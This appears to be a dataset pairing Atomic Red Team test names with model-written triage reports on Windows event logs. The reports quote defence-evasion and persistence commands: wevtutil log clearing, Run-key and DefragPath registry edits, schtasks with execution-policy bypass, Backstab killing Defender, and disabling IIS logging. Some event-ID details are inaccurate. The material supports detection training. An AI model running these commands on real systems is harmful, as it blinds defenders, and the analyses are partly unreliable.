   - **Execution of `wevtutil.exe` (Sysmon Event ID 1):** Multiple executions of the `wevtutil.exe` utility with the `cl` option, indicating log clearing for various logs (e.g., Sysmon, Application, Security). This was observed related to the `admin_test` user and is typically considered a suspicious activity.

3. **Use of PowerShell and Cmd:**
   - **PowerShell Execution (Sysmon Event ID 5):** The execution of PowerShell by `admin_test` could indicate script-based attacks or lateral movement within the environment if not authorized.
   - **Cmd Process With Suspicious Command Line:** A `cmd.exe` process executed with a long command line involving copying and compiling a JavaScript file using jsc.exe, which is unusual and could indicate an attempt to execute or obfuscate code (Sysmon Event ID 1 - Process: `cmd.exe`). This involves the Atomic Red Team directory, which is often used for testing attack tactics, indicating potential use in testing attack vectors or actual compromise.
   - The execution of `.NET` and `cvtres.exe` utilities following this command could indicate further attempts at obfuscation or manipulation of code artifacts.

4. **Process Creation and Execution:**
   - **Edge Installer Activity (Sysmon Event ID 1):** Multiple executions of setup.exe related to Microsoft Edge can be legitimate if due to updates. However, the timing and correlation to log clearing activities might suggest the need for verifying these actions.
   - **Execution and Clearing of High-Integrity Level Processes:** Processes executed at a high integrity level (e.g., `wevtutil.exe`) by the `admin_test` user are relevant when seen with other suspicious activities.

5. **Multiple Logon Events (Security Log):**
   - **Privilege Assignments (Event ID 4672):** The SYSTEM account acquiring extensive privileges like `SeDebugPrivilege`, `SeLoadDriverPrivilege`, potentially allowing sensitive activities if misused.

Considering this evidence, there is a significant level of suspicious activity that warrants further investigation to determine the full context and legitimacy of these actions. While some elements might appear routine in a highly-managed server environment, the combination and nature of these logged events strongly suggest possible malicious intent — especially clearing logs and executing unusual commands.

**Resolution: SUSPICIOUS**

### Recommendations:
- **Immediate Review:** Conduct a comprehensive investigation to validate whether these activities were authorized. 
- **User and Access Control:** Verify the recent activities and access permissions of the `admin_test` account.
- **Incident Response:** If these actions are not confirmed to be legitimate, escalate to an incident response workflow to contain and investigate potential breaches.
- **Monitoring and Audit:** Enhance monitoring for log file clearing and process execution activities, especially those tied to misuse of administrative privileges.
- **Patch Management:** Ensure all systems, especially commonly abused components like PowerShell and wevtutil, are up-to-date with patches and follow best security practices."
Windows Auto Update Option to Notify before download,"Upon reviewing the provided Windows event logs across the Security, Sysmon, Application, PowerShell, and System logs, several indicators point to potential suspicious or malicious activities. Below is a detailed analysis:

### Key Observations:
1. **Log Clearing Activity:**
   - Event ID 1102 in the Security log indicates that the security logs were cleared by the user `admin_test`. This is a critical red flag as log clearing is often an attempt to erase tracks after malicious activity.

2. **Time Manipulation:**
   - Event IDs 4616 and 1 in the Security and System logs show time changes by the service `svchost.exe`. Altering system time can be indicative of malicious intent to confuse log timelines or defeat time-based security mechanisms.

3. **Privilege Escalation:**
   - Event IDs 4672 warrant attention. They indicate that the account `admin_test` obtained privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are often associated with malicious use cases like injecting code into other processes or taking control of the system.

4. **Suspicious Process Execution:**
   - The Sysmon logs show `wevtutil.exe` being used extensively for log management (`cl` commands to clear logs). This, in conjunction with log clearing activities, suggests malicious cleaning of evidence.
   - The Sysmon process log indicates execution of commands typically associated with system changes (`reg.exe` modifying registry settings for Windows Update). This could have implications for system stability or could be used for a persistent mechanism further downstream.

5. **System Reconfiguration:**
   - Execution of `cmd.exe` and `reg.exe` via administrative privileges to alter Windows Update settings may imply an attempt to change system behavior, potentially preventing patches and updates, leaving the system vulnerable.

### Assessment:
The combination of log clearing, privilege escalation, system time manipulation, and suspicious process activity strongly suggests attempts to cover tracks, maintain persistence, and alter system behavior, common tactics used in malware or intrusion activities.

### Resolution:
Based on the activities observed:
- **Resolution: MALICIOUS**
  
### Guidance:
1. **Immediate Actions:**
   - Isolate the affected host (`Server002`) from the network to prevent further spread or exfiltration of data.
   - Conduct a full malware scan and forensic investigation on the host.
   - Analyze other systems for similar indicators of compromise, considering this could be part of a larger breach.

2. **Long-term Measures:**
   - Review user privileges and enforce the principle of least privilege.
   - Regularly back up logs to secure external sources to detect log tampering.
   - Implement enhanced monitoring for privileged account activities and log clearing events.

The actions above are suggested to mitigate any potential risks and to improve security posture against such incidents in the future."
Tamper with Windows Defender Evade Scanning -Process,"### Analysis

Upon reviewing the logs, there are several indicators of potentially malicious activity worth highlighting:

1. **Event Log Clearance:**
   - Multiple instances of the `wevtutil.exe` being executed with the command-line to clear logs. This action is primarily used to clear system logs, which is a common tactic used by attackers to cover their tracks:
     - System log (EventID: 104 for 'Microsoft-Windows-Eventlog') shows logs cleared by a user named `admin_test`.
     - Security log (EventID: 1102 for 'Microsoft-Windows-Eventlog') also indicates log clearance.

2. **PowerShell Activity:**
   - A suspicious PowerShell command observed in the PowerShell logs involves modifying Microsoft Defender preferences to exclude a process named `outlook.exe`. This behavior is often indicative of an attempt to disable or evade security defenses by excluding potentially malicious processes from being monitored or scanned by the antivirus software.

3. **Command Execution:**
   - There was an instance of suspicious command execution where certain utilities like `whoami`, `hostname`, and `taskhostw.exe` were invoked. While usage of these commands can be legitimate, they are sometimes used by malicious actors to gather system-level information and execute tasks without raising significant alarms.

4. **Presence of High Integrity Processes:**
   - The logs show processes running with high integrity levels under the `admin_test` user, which implies they might have administrative privileges. Combined with the log-clearing behavior, this elevated privilege should be scrutinized further.

### Assessment:

Based on the identified activities, these logs present several behaviors associated with potentially malicious activity:

- Log clearance, particularly across multiple log channels, is a critical marker of forensic evasive techniques.
- The alteration of antivirus exclusions using PowerShell suggests an intent to undermine system defenses.
- The use of administrative-level accounts to execute these commands further exacerbates the risk as it indicates the actor had significant control over the system.

### Resolution:

**Resolution:** MALICIOUS

Given the severity and the combination of log clearance and antivirus evasion tactics, this indicates a highly likely compromise of the system. Immediate actions should be taken, including:
- Conducting a thorough threat sweep on the affected host and network.
- Reviewing user account activity, especially focusing on `admin_test` for unauthorized access.
- Implementing additional security monitoring and logging mechanisms to detect similar patterns in the future.
- Considering a system restore or rebuild if integrity cannot be assured post-investigation."
Indirect Command Execution - Scriptrunner.exe,"After thoroughly reviewing the provided logs, the following observations and analysis have been made:

### Observations:
1. **Sysmon Logs:**
   - There are multiple instances of the `wevtutil.exe` utility being executed with a command to clear various Windows event logs, including ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"".
   - The commands are executed by user `SERVER002\admin_test` with high integrity level, and the parent process is consistently `wsmprovhost.exe`.

2. **System Logs:**
   - The logs indicate system event and PowerShell logs were cleared. This aligns with the corresponding `wevtutil.exe` executions from the Sysmon logs.
   - A time change event is noted, possibly indicating manipulation of system time, which is commonly used during log tampering to cleanly cover tracks.

3. **Security Logs:**
   - The security event log entry shows it was cleared by the same user, `admin_test`.

4. **Windows PowerShell Logs:**
   - The PowerShell activity involves an executed script that includes the launch of `calc.exe`. While `calc.exe` is a legitimate program, the execution pattern might be indicative of testing or an attempt to blend malicious activity amidst benign operations.

5. **Application and EdgeUpdate Logs:**
   - Regular maintenance and updates of Microsoft Edge through `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86.exe` were also noted but appear consistent with standard system operations.

### Analysis:
- The repeated use of `wevtutil.exe` to clear logs specifically targeting different types of event logs strongly suggests an attempt to cover or remove tracks of prior actions on the system. Log clearing without a clear administrative or operational need is typically seen as suspicious behavior.
- The execution of PowerShell with inclusion of potentially misleading or extraneous commands (like opening `calc.exe`) may imply attempts to obscure normal PowerShell usage.
- The time manipulation incident could correlate with attempts to align or obfuscate timestamps in logs, though this aspect would benefit from deeper investigation into potential causes and affected services or configurations.

### Conclusion:
The combination of actions aimed at clearing logs and manipulating system times, compounded by the lack of typical justifying context or approval for such actions, strongly indicates suspicious behavior, potentially indicative of malicious activity.

### Resolution:
- **SUSPICIOUS**: The activities in the logs are highly indicative of attempts to hide actions on the system, potentially malicious in nature. Additional investigation is necessary to understand the context and scope, evaluate user access patterns, and discern if sensitive data or processes were affected.

### Recommended Actions:
1. **Immediate Response**:
   - Assess the current state of the server for any ongoing suspicious activities.
   - Isolate the system if necessary to prevent further potential compromise.

2. **Further Investigation**:
   - Conduct a thorough forensic analysis to recover the cleared logs, if possible, using backups or shadow copies.
   - Investigate the user account `admin_test` for unauthorized access or any deviation from normal behavior.
   - Review system time change logs for any anomalies potentially pointing towards unauthorized time adjustments for administrative deception.

3. **Post-Incident Review**:
   - Ensure all security patches are up to date.
   - Review access and authorization policies to limit unnecessary privileges.
   - Consider enabling advanced threat detection and response systems for future prevention."
Creating W32Time similar named service using schtasks,"Upon reviewing the provided logs, several events raise concerns regarding suspicious or potentially malicious activities:

1. **Log Clearing:**
   - The Sysmon logs indicate several instances of `wevtutil.exe` being executed with the command to clear logs (e.g., `cl Microsoft-Windows-Sysmon/Operational`). This is followed by similar activities affecting the Application, Security, System, and Windows PowerShell logs, as indicated by Sysmon EventIDs 5 with log file cleared details.
   - Event ID 104 in the System log and Event ID 1102 in the Security log confirm that Event logs were cleared. The user `admin_test` seems responsible for these actions. Frequent log clearing can be an indication of an attempt to cover tracks, which is suspicious behavior.

2. **Scheduled Task Creation:**
   - A command executed by `cmd.exe` is seen creating a scheduled task (`schtasks.exe`) that attempts to execute a PowerShell script (`c:\\T1036.004_NonExistingScript.ps1`) with the `-ep bypass` flag, which could allow potentially malicious scripts to run without restrictions. This is aligned with known tactics used in malicious activities to maintain persistence or execute malicious payloads.

3. **Use of WMI:**
   - The presence of `wmiprvse.exe -Embedding` indicates WMI Provider Host usage, which in isolation is not suspicious, but given its context connected to cleared logs and task creation, warrants further scrutiny.

Given these findings:

- **Presence of activity to clear logs**
- **The creation of a scheduled task potentially set to execute a suspicious PowerShell script bypassing execution policy**

The combination of these activities suggests an attempt to evade detection and achieve persistence on the host. 

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Isolate the Affected System:** Temporarily isolate Server002 from the network to prevent any further potential malicious activity.
2. **Forensic Analysis:** Conduct a detailed forensic analysis to recover cleared event logs and further inspect the PowerShell scripts and scheduled tasks.
3. **User Activity Review:** Review user `admin_test` activities and consider resetting credentials.
4. **Malware Scan:** Run a comprehensive antivirus and malware scan on the host.
5. **Audit Other Systems:** Consider auditing other systems for similar log-clearing activities, suspicious tasks, or abnormal command executions.
6. **Apply Critical Security Patches:** Ensure all security updates are applied to minimize vulnerabilities.
7. **Incident Response:** Engage with your incident response team to handle the ramifications of this breach and assess if data exfiltration occurred.

These steps will help ascertain the full extent of the breach and prevent future incidents."
Abusing MyComputer Disk Fragmentation Path for Persistence,"### Analysis of Logs:

1. **Event Clearing Activity:**
   - **Sysmon Log:** Multiple events show the execution of `wevtutil.exe`, which was used to clear logs like ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Windows PowerShell"" logs. This activity is executed by the user `SERVER002\admin_test`.
   - **System Log Entries:** Matching entries indicate the logs being cleared by `admin_test`.

2. **Registry Modification:**
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath"" ...` makes modifications to the Windows registry to assign `notepad.exe` as the defrag path. Registry modification events, especially in this path, are common indicators of persistence mechanisms used by malware.

3. **Execution of Common Utility Programs:**
   - Numerous entries show the execution of system utilities like `hostname.exe` and `whoami.exe`. While these programs are not inherently malicious, frequent execution, especially from a singular context, may suggest profiling or reconnaissance activities.

4. **Microsoft Edge Update Activity:**
   - Regular activities of `MicrosoftEdgeUpdate.exe` are observed, which might relate to legitimate software update processes from Microsoft, without any evident anomalies in its execution context or parameters.

5. **Time Change:**
   - Kernel-General events indicate a time change, which might be due to synchronization with the Network Time Protocol (NTP). This is a benign activity unless observed in conjunction with other suspicious behaviors.

### Assessment of the Situation:

**Threats or Risks Identified:**
- The clearing of logs is a significant indication of suspicious behavior as it suggests an attempt to remove traces of activity.
- Registry modification in a less common directory (`DefragPath`) for launching `notepad.exe`, suggests possible persistence or execution technique through registry keys.
- The combination of these behaviors (log clearing and registry modification) clearly deviates from normal system usage patterns and suggests malicious intent to cover tracks or maintain persistence.

**Guidance on How to Proceed:**
- **Immediate Action:**
  - Isolate the affected host to prevent any further unauthorized activities.
  - Perform a forensic analysis of the host for any additional signs of compromise not captured in the logs (disk image, memory analysis).
- **Remediation Steps:**
  - Restore cleared logs from backups to fully understand the extent of the activity.
  - Evaluate and clean the modified registry keys if determined unauthorized.
- **Preventive Measures:**
  - Implement rigorous monitoring and alert mechanisms for similar command executions and log-clearing events.
  - Conduct a review of user accounts and privileges to prevent misuse.

- **MALICIOUS** - The logs exhibit clear signs of malicious activity, particularly with event log clearing and unauthorized registry modification. Further investigation and remediation actions are necessary to address and resolve the compromise."
Execute base64-encoded PowerShell,"Upon analyzing the provided logs, the following suspicious and potentially malicious activities were identified:

1. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` being executed with the command-line argument `cl` and targeting various logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `""Windows PowerShell""`. This indicates the clearing of event logs, which is a well-known tactic used by attackers to cover up their malicious activities after gaining access to a system.
   - The user `SERVER002\admin_test` was associated with the execution of these commands, all run with high integrity levels.

2. **System Logs:**
   - Event ID 104 indicates that logs have been cleared for the `System` and `Windows PowerShell` channels by the same `admin_test` account around the time the `wevtutil` commands were executed.

3. **Security Logs:**
   - Event ID 1102 indicates that the security log was cleared, typically an administrative action to cover tracks.
   - The user `SERVER002\admin_test` cleared the `Security` log approximately at the same time identified in the Sysmon logs.

4. **PowerShell Logs:**
   - Suspicious PowerShell command execution using encoded commands. This method is often used to obfuscate the activities being conducted to avoid detection. The command `Write-Host ""Hey, Atomic!""` encoded suggests testing or validation by the attacker.

5. **Logs Correlation:**
   - The timing of events related to log clearing matches across Sysmon, System, and Security logs, further corroborating suspicious behavior by `admin_test`.

### Assessment:
Given these activities, particularly the clearing of logs and use of obfuscated PowerShell commands, there is strong evidence of attempts to hide actions on the system, indicative of malicious intent.

### Recommendation:
- **Resolution: MALICIOUS** - The observed activities represent a strong indication of system compromise. Immediate steps should be taken to:
  - Isolate the affected system to prevent further potential compromise of the network.

User scope COR_PROFILER,"Upon reviewing the Windows event logs, there are several indicators that suggest potential malicious activity:

1. **PowerShell Activity**:
   - The logs show a PowerShell script that is being executed with commands to create registry keys in a suspicious manner, specifically within the `HKCU:Software\Classes\CLSID` path. This is often associated with attempts at persistence or privilege escalation.
   - The script involves the creation of registry entries likely intended for environment variable manipulation (`COR_ENABLE_PROFILING`, `COR_PROFILER`, `COR_PROFILER_PATH`). These actions are indicative of the ""Environment Injection"" tactic, which could be abused for process injection or privilege escalation.
   - The usage of paths like `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1574.012\bin\T1574.012x64.dll` suggests a simulation or test for a known MITRE ATT&CK technique, which could imply that someone was either testing security controls or staging for a potential attack.

2. **Event Logs Being Cleared**:
   - Several system and security event logs have been cleared, evident from the presence of `Event ID 104` (indicating the clearing of system logs) and `Event ID 1102` (indicating the clearing of security logs). This behavior is a common tactic used by attackers to cover their tracks after malicious activities.

3. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` being run with the `cl` parameter signify the command to clear event logs. This activity aligns with the cleared logs mentioned above and is a concerning indicator of someone attempting to tamper with log evidence.
   - PowerShell execution is recorded alongside the `mmc.exe` starting `eventvwr.msc`, which could be consistent with UAC bypass techniques whereby an attacker leverages the Event Viewer utility to execute further malicious payloads with elevated privileges.

Given these observations:

- **Assessment and Threats**:
  The combination of scripting activity modifying registry keys for profiling and process control, alongside event log tampering, strongly suggests malicious intent. These actions reflect typical adversary behavior attempting persistence, privilege escalation, and antiforensics.

- **Guidance**:
  Immediate action should be taken to isolate the affected system to prevent further compromise. Forensic analysis should be performed to ascertain the full extent of the breach and try to determine the initial point of compromise. It would also be prudent to review access logs and user accounts, particularly focusing on the account `admin_test` which appears frequently across these logs.

Based on the analysis, the resolution for the observed activities in the logs is:

- **MALICIOUS** - The logs contain activity that is strongly indicative of malicious behavior."
Disable Windows IIS HTTP Logging,"After analyzing the provided logs from various categories, such as Sysmon, Windows PowerShell, Application, Security, and System logs, the following observations are made:

1. **Sysmon Log Observations**:
   - There are multiple instances of PowerShell execution reflected in the logs, specifically targeting the command `C:\\Windows\\System32\\inetsrv\\appcmd.exe set config ""Default Web Site"" /section:httplogging /dontLog:true`. This might indicate an attempt to modify IIS settings for HTTP logging, possibly to obscure illicit activities.
   - Use of `wevtutil.exe` by the user `admin_test` to clear event logs (EventID 104 and 1102 for System and Security logs) is suspicious. This could indicate an attempt to cover tracks of unauthorized activities.
   
2. **Windows PowerShell Log Observations**:
   - The presence of the PowerShell command altering IIS configurations as mentioned above is consistent across logs, which is unusual activity for a regular admin operation.
   
3. **Application Log Observations**:
   - The logs reflect routine operations associated with Microsoft Edge updates. These do not inherently indicate malicious activity by themselves.
   
4. **Security Log Observations**:
   - The clearing of Security logs confirms suspicious behavior detected in the Sysmon logs (EventID 1102), typically indicating an effort to delete potential forensic evidence.
   
5. **System Log Observations**:
   - The clearing of System logs is similarly noted alongside corresponding Sysmon log entries (EventID 104).

**Overall Assessment and Findings**:
- The command executed via PowerShell to alter HTTP logging and the clearing of event logs together point towards suspicious behavior.
- Such actions are commonly associated with attempts to hide unauthorized activity, suggestive of a potential security incident.

**Resolution**: **SUSPICIOUS**
- The behavior observed is suspicious, indicating the possibility of unauthorized activity and warrants further investigation. It's recommended to:
  - Conduct a thorough review of user `admin_test`'s recent activities.
  - Examine network logs for any unusual or unauthorized traffic during the timeframe in question.
  - Restore backed-up logs (if available) to further assess what might have been cleared.
  - Ensure that proper access controls and monitoring systems are in place to prevent tampering or misuse."
DLL Side-Loading using the Notepad++ GUP.exe binary,"Upon analyzing the provided Windows Event Logs, several observations point towards potentially suspicious activities. Let's break down the key findings:

1. **Event Log Cleared Entries:**
   - The `EventID 104` in the System log indicates that logs for the System and Windows PowerShell channels have been cleared by the user `admin_test`. This could be an attempt to hide malicious activities, as clearing event logs is a common technique used by attackers to cover their tracks.

2. **Sysmon Logs Relating to `wevtutil.exe`:**
   - Multiple entries indicate the execution of `wevtutil.exe` to clear logs. `wevtutil.exe` is a legitimate Windows utility for managing event logs but it can also be used maliciously to clear logs as seen in actions with `CommandLine` arguments like `""C:\\Windows\\system32\\wevtutil.exe"" cl System`, which clears the System logs.

3. **Execution of `cmd.exe` and `GUP.exe`:**
   - An entry shows `cmd.exe` executing a command to run `GUP.exe` from a `Temp` directory associated with `AtomicRedTeam`, a known testing tool. While `AtomicRedTeam` is generally used for Blue Team training exercises and simulations, its presence in environments where it's not expected can be suspicious.

4. **Repeated Execution of `whoami.exe` and `hostname.exe` in Sysmon Logs:**
   - Executions of `whoami.exe` and `hostname.exe` likely reflect some reconnaissance. While these are legitimate tools, their usage should be understood in context. If unrelated to any administrative task or script, they can indicate account information gathering or operations enumeration.

5. **Powershell and System Logs:**
   - The clearing of PowerShell and System logs by the `admin_test` user aligns with attempts to obscure operations or commands executed through PowerShell, further increasing the suspicion of malicious activity.

Based on these observations, the overall assessment is:

**Resolution: SUSPICIOUS**

### Threats or Risks Identified:
- Potential insider threat or compromised account (`admin_test`), using legitimate tools to execute malicious activity.
- Use of legitimate system utilities for malicious purposes (log clearing).
- Potential execution of possibly harmful scripts or programs (`GUP.exe`) from a temporary directory, typically associated with testing tools but could be malicious if not sanctioned.

### Guidance on How to Proceed:
1. **Account Investigation:** Verify the activities of the `admin_test` account, including any unexpected access or behavioral changes. Ensure the account credentials are secured.
  
2. **Log Monitoring:** Establish monitoring for further `wevtutil.exe`, `cmd.exe`, and PowerShell activities, focusing on unusual log-clearing actions.
  
3. **Environment Audit:** Review the installation and use of any security tools like `AtomicRedTeam` within the environment to ensure they were sanctioned.

4. **Forensic Analysis:** Conduct a more in-depth forensic analysis of the host to identify any lasting changes or additional indicators of compromise.

5. **Security Controls:** Implement stricter security controls and alerts for critical activities such as log clearance, particularly for sensitive accounts.

Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,"**Detailed Analysis of the Logs:**

1. **Event Log Clearing Activity:**
   - Multiple logs indicate that event logs have been cleared using the `wevtutil.exe` command. Specifically, the Security, System, and Windows PowerShell logs have been cleared by the user ""admin_test"" on ""Server002"". The use of `wevtutil.exe` to clear logs is a suspicious action typically associated with attempts to cover tracks from investigations into unauthorized or malicious activities.

2. **PowerShell Activity:**
   - The logs show that PowerShell was used to disable multiple Windows Defender components. The script executed includes commands like `Disable-WindowsOptionalFeature` for various Windows Defender features. Disabling security features such as Windows Defender is typically considered suspicious as it reduces the system's security posture and could be indicative of a compromise or preparation for further malicious activity.

3. **Frequent `conhost.exe` and `wevtutil.exe` Process Creation:**
   - There is frequent invocation of console host `conhost.exe` tied to the `wevtutil.exe` process, which suggests that clearing logs might have involved multiple operations or scripts running in sequence.
   
4. **Suspicious Temporary DISMHost Activity:**
   - Execution of `DismHost.exe` from temporary folders with high integrity and spawning from PowerShell indicates potentially malicious actions. DismHost is often used for servicing Windows images and is less expected to be involved in standard operations initiated from temporary folders by administrative scripts.

5. **Microsoft Edge Updates:**
   - There is significant activity surrounding the Microsoft Edge Update process, which appears regular for software updates from 'Microsoft Corporation' and ties to system processes (`NT AUTHORITY\SYSTEM`). Given the context, this operation appears legitimate, albeit unrelated to the more suspect activities.

**Assessment and Conclusion:**
The behavior exhibited in the logs suggests significant anomalous and suspicious activity, including log clearing, disabling of security features, and execution of processes from temporary directories. While the disabling of Windows Defender protections using PowerShell could be part of a legitimate administrative task, it typically requires further investigation due to the security risk it poses, particularly when seen alongside log clearing.

**Resolution:**
- **SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Threat Assessment:**
   - Verify whether the logged activities were authorized by consulting the responsible administrator (admin_test) or systems team.
   - Conduct a full audit of user permissions and recent activity for the user ""admin_test"".

2. **Containment and Monitoring:**
   - Ensure Windows Defender and other security features are re-enabled.

   - Consider additional logging and alerting around PowerShell commands and log manipulation commands like `wevtutil.exe`.
   - Educate users on the implications of disabling security features and ensuring all activities are adequately logged and audited.
"
Install root CA on Windows,"**Detailed Analysis:**

1. **Log Clearing Activity:**
   - **Security Log 1102 and System Log 104:** The logs show that the user ""admin_test"" executed commands to clear multiple Windows Event Logs (Security, System, and Windows PowerShell). This is a highly suspicious activity because clearing logs often indicates an attempt to cover up malicious actions, such as unauthorized access or data extraction.

2. **Process Execution and Privilege Escalation:**
   - **Sysmon Logs (Process ID 5080, 544, 6912, 5520, 5744):** These entries show the use of `wevtutil.exe`, a utility to manage Windows Event Logs, to clear various logs. The command execution context (High Integrity Level with admin user ""admin_test"") and the sequence of clearing multiple logs concurrently suggest a deliberate action to wipe traces of activities.
   - **Event ID 4624 and 4672:** Successful logon and privilege assignment to the SYSTEM user. This suggests that an elevated privilege session was established, likely necessary for the subsequent log clear activities.
  
3. **Suspicious PowerShell Use:**
   - **Sysmon Event Log 17990 (PowerShell):** The execution of a PowerShell script that imports a certificate and moves it to a trusted store. This activity can be benign in some IT administrative contexts, but combined with the log clearing and the same user's involvement, it raises the concern level.
   - **Windows PowerShell Logs:** The logs reflect a session with an administrative PowerShell script being run, which aligns with the potential configuration changes indicative of a compromise attempt.

4. **Credential Access and Anomalies:**
   - **Security Logs (5379):** These logs indicate attempted retrieval of credentials related to Microsoft accounts and Windows Live tokens. Although the attempts failed (return code 3221226021), frequent and systemic credential access attempts can signify malicious intent.

**Threat/Risk Assessment:**

- The concerted log clearing activities by the ""admin_test"" user, especially targeting crucial log files (Security, System, and PowerShell), alongside PowerShell actions that involve potentially sensitive operations, are strong indicators of suspicious if not outright malicious activity.
- The activity pattern suggests a user with administrative privileges attempting to hide tracks after performing potentially unauthorized operations.
- While failed credential access attempts don't immediately indicate compromise, they underscore risks when combined with other suspicious behaviors.

**Guidance on How to Proceed:**
- **Resolution: MALICIOUS** due to the combined evidence of log clearances, high-integrity PowerShell usage modifying certificate stores, and anomalous failed credential retrieval, which supports a conclusion of compromised or malicious administrative actions.
- Immediate actions should include conducting a thorough system review to identify any further signs of compromise, possible backdoors, or data exfiltration.
- Revoke or closely monitor the ""admin_test"" account privileges, verify all security and logging configurations, and ensure comprehensive logging is enabled.
- Coordinate with incident response to assess the scope and impact, and consider isolating the affected systems until a full investigation is complete."
Kill antimalware protected processes using Backstab,"Upon reviewing the provided Windows event logs, there are several key observations that indicate suspicious and potentially malicious activity:

1. **PowerShell Execution**: The logs show the execution of PowerShell with commands related to a suspicious file path, indicating the usage of an executable named `Backstab64.exe`. This was executed with PowerShell using the command-line: `""powershell.exe"" & {& \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\Backstab64.exe\"" -k -n MsMpEng.exe}`. The file `Backstab64.exe` executed from a temporary directory raises concern, especially with the additional command-line arguments `-k -n MsMpEng.exe`, which might be an attempt to target or evade antivirus services (MsMpEng.exe is associated with Windows Defender).

2. **Clearing of Event Logs**: The logs also indicate that log files have been cleared. Specifically, the System and Windows PowerShell logs were cleared by the user `admin_test`. Log clearance is a typical behavior associated with efforts to cover tracks after a malicious attack. The timing of these clearance events corresponds closely with the PowerShell execution, reinforcing the suspicion.

3. **Repetitive `wevtutil` Usage**: There is frequent usage of `wevtutil.exe` to clear logs such as ""System"", ""Application"", and ""Security"". Such behavior is abnormal under standard practices and often correlates with attempts to manually erase evidence of activities.

4. **Contextually Suspicious**: The sequence of events, where a PowerShell script with suspicious payload is executed followed by the clearing of logs, aligns with known malicious patterns, including execution and cover-up tactics.

The behaviors presented in these logs strongly suggest that they are part of a more extensive attack or test scenario (likely a Red Team or penetration testing exercise given the directory name ""AtomicRedTeam""). The presence of an executable run from a temporary directory, paired with the strategic clearing of logs, is generally considered clear evidence of malicious activity.

### Conclusion: MALICIOUS

The analysis concludes that there is evidence of malicious activity within the logs. There is a risk of system compromise, data exfiltration, or potential further attacks on this system. 

### Recommended Actions:
- **Containment**: Immediately isolate the affected machine (Server002) from the network to prevent any further malicious activity or spread of compromise.
- **Investigation**: Conduct a detailed forensic investigation on Server002 to understand the full scope and impact of the breach. This includes analyzing the executable `Backstab64.exe` and tracking any potential persistence mechanisms or additional payloads.

### Analysis:

1. **System Log Events:**
   - **Event ID 104 & 1102:** The clearing of the event logs (System, Application, PowerShell, and Security) by the user ""admin_test"" is highly suspicious. Log clearing activity can indicate an attempt to cover tracks after performing unauthorized or malicious actions. It's abnormal unless there's a known legitimate reason for these actions, such as routine maintenance performed by a trusted administrator.
   
2. **Sysmon Log Events:**
   - **Frequent Execution of `wevtutil.exe`:** This tool is used to manage event logs and has been used to clear logs in this instance. The execution multiple times within a short timeframe, with commands indicating log clearance, aligns with the suspicious log clearance activities.
   - **Registry Modification via `cmd.exe`:** The execution of commands involving registry changes through `cmd.exe` suggests possible persistence mechanisms being implemented. These changes are executed by ""admin_test"" and involve registry entries related to Windows Explorer's appearance settings. Registry modifications can often be associated with malware attempting to establish persistence or alter system behavior.
   - **Frequent Execution of EdgeUpdate:** Numerous processes relating to Microsoft Edge Update were logged. While these may ordinarily be benign, the pattern and volume stand out. The execution paths suggest a legitimate update, but verifying the legitimacy and authenticity of these update processes based on known trusted updates is recommended.

3. **User/Session Integrity:**
   - The actions were carried out with ""High"" to ""System"" integrity levels, suggesting administrative privileges were utilized, increasing the potential impact of these activities if they are indeed malicious.

### Verdict:

Based on the observations, the presence of log clearing events, registry modifications, and frequent process startups related to system utilities indicate activities that deviate from normal patterns of benign behavior. Therefore, it is prudent to classify these findings as **SUSPICIOUS**.

### Recommendations:

- **Immediate Action:** Conduct a thorough internal investigation to confirm whether the actions performed by ""admin_test"" are legitimate, review the access logs for any unauthorized access, and determine if there is any unapproved software installation.
- **Monitoring and Alerts:** Enhance the monitoring around this host and related accounts to promptly detect further suspicious activities.
- **Security Tools Utilization:** Utilize threat intelligence and endpoint detection and response (EDR) tools to investigate underlying causes and potential impacts of these events.
- **User Verification:** Verify the identity and authorization of ""admin_test"" and any potential compromise of credentials.
- **System Integrity Check:** Assess the integrity of critical system files and configuration by comparing them against known good states or using integrity monitoring tools.

These steps will help ensure that any potential threat is properly assessed and mitigated."
Modify Registry of Local Machine - cmd,"Based on the analysis of the provided Windows event logs, several activities stand out as potentially suspicious, which indicate a need for further investigation:

1. **Event Log Clearing:** There are multiple instances of event logs being cleared (Event ID 104 for System and Event ID 1102 for Security). The logs were cleared by the user `SERVER002\admin_test`, which suggests an attempt to cover tracks. This behavior is commonly associated with malicious activity.

2. **Abnormal Registry Modification:** There is an event where a registry key was added to the Run key (`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`) with a command to execute `calc.exe` (Event ID 1 for `cmd.exe` with a registry modification command). This is a known technique to achieve persistence on a system, where malware ensures it runs after a system reboot.

3. **Frequent Execution of `wevtutil`:** The `wevtutil.exe` process was used several times with the command-line arguments indicating the clearing of event logs (e.g., `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`). This is further evidence of log tampering, which is often a red flag for malicious activity.

4. **High-Integrity Execution:** Many of these actions, such as the ones involving `wevtutil.exe` and modification of registry entries, are executed with high integrity, suggesting privilege execution which further supports the notion of unauthorized and potentially malicious activities.

5. **Console Host Sessions:** The repeated spawning of `conhost.exe` processes alongside the aforementioned suspicious activities might be a part of a script or tool used for automation in log manipulation and execution of commands.

6. **Microsoft Edge Updates:** There are multiple events related to `MicrosoftEdgeUpdate.exe`, which appear frequent and might be benign as they are part of system updates. However, their frequency and timing in proximity to identified suspicious activities warrant a closer look.

### Resolution: Malicious

The combination of log clearing, unauthorized registry modification for persistence, and high integrity process actions strongly indicate malicious activity. The evidence of attempts to hide actions by clearing logs and modifying the registry for persistence is characteristic of a compromised system.

### Guidance:

